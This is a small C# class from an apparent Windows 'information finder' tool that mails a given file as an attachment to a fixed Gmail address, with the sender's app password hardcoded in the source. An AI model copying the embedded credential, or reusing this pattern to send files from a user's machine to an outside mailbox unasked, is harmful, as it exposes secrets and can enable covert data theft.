using System.IO;
using System.Net;
using System.Net.Mail;
namespace WindowsInformationFinder
{
    class Mail
    {
        public void SendEmailNotification(string subject, string body, string attachmentFilePath)
        {
            var fromAddress = new MailAddress("oreshkayes@gmail.com", "fromRuslan");
            var toAddress = new MailAddress("ruslanshatkun@gmail.com", "toRuslan");

            const string fromPassword = "lfqs kmam lztt edbi";

            var smtp = new SmtpClient
            {
                Host = "smtp.gmail.com",
                Port = 587,
                EnableSsl = true,
                DeliveryMethod = SmtpDeliveryMethod.Network,
                UseDefaultCredentials = false,
                Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
            };

            using (var message = new MailMessage(fromAddress, toAddress)
            {
                Subject = subject,
                Body = body
            })
            {
                if(!string.IsNullOrEmpty(attachmentFilePath) & File.Exists(attachmentFilePath)) {
                    message.Attachments.Add(new Attachment(attachmentFilePath));
                }
                smtp.Send(message);
            };
        }
    }
}
